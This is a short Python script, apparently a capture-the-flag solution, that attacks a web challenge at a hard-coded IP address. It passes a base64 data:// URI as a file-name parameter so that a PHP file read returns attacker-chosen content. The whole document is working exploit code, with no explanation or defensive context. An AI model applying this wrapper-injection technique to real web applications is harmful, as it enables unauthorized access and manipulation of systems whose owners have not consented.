import base64

import requests

target = 'http://120.24.86.145:8002/web8/'

r = requests.get(target, params={
    'ac': 'accc',
    'fn': 'data://text/plain;base64,' + base64.b64encode('accc'.encode()).decode()
})

print(r.text)
